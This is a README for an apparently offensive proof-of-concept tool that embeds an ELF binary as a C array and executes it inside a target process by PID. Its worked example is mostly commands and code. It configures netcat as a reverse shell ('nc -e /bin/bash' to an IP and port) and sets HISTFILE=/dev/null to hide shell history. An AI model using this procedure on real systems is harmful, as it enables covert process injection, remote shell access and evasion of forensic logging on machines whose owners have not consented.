# userland exec poc
userland exec poc

## Usage
1. download the latest [userland-exec](https://github.com/shuichiro-endo/userland-exec)
```
git clone https://github.com/shuichiro-endo/userland-exec.git
cd userland-exec
```
2. output an elf file you want to run to elffile.h file (e.g. /usr/bin/nc)
```
xxd -i /usr/bin/nc > elffile.h
```
3. get a variable from elffile.h file (e.g. unsigned char _usr_bin_nc[])
```
head -1 elffile.h
```
4. modify ulexec.c file (exec_file, env_string, env_count, argv_string and argv_count)
```
// head -1 elffile.h
// e.g. unsigned char _usr_bin_nc[] = {
unsigned char *exec_file = _usr_bin_nc;

char *env_string[] = {
"PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:", 
"SHELL=/bin/bash", 
"HISTFILE=/dev/null", 
"\0", 
"\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0"};	// do not delete

int env_count = 3;

// e.g. nc -e /bin/bash 127.0.0.1 1234
char *argv_string[] = {
"-e", 
"/bin/bash", 
"127.0.0.1", 
"1234", 
"\0", 
"\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\0"};	// do not delete

int argv_count = 5;	// exec file name + argv_string
```
5. build
```
gcc ulexec.c -o ulexec
```
6. run ulexec
```
userland exec
usage         : ./ulexec -p target pid
example       : ./ulexec -p 12345
```

## License
This project is licensed under the MIT License.

See the [LICENSE](https://github.com/shuichiro-endo/userland-exec/blob/main/LICENSE) file for details.


